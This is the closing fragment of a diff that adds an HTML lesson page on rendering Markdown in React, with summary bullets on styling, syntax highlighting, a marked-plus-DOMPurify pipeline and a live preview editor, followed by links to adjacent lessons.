+      <li>Style rendered Markdown with a scoped CSS class like <code>.markdown-content</code> that targets all standard HTML elements.</li>
+      <li>Syntax highlighting libraries like highlight.js or Prism colorize code blocks based on the language identifier.</li>
+      <li>The complete pipeline is: write Markdown, store in DB, fetch, convert with <code>marked</code>, sanitize with DOMPurify, render with <code>dangerouslySetInnerHTML</code>.</li>
+      <li>A live Markdown preview editor is a split-pane layout: textarea on the left, rendered output on the right, using <code>useMemo</code> for performance.</li>
+    </ul>
+  </section>
+
+</main>
+
+<!-- ── BOTTOM NAV ── -->
+<nav class="lesson-nav bottom">
+  <a href="43-realtime-updates.html">&larr; Previous: Real-Time Updates &amp; Polling</a>
+  <a href="../index.html">Curriculum Index</a>
+  <a href="45-print-document-generation.html">Next: Print-Ready Document Generation &rarr;</a>
+</nav>
+
+</body>
+</html>
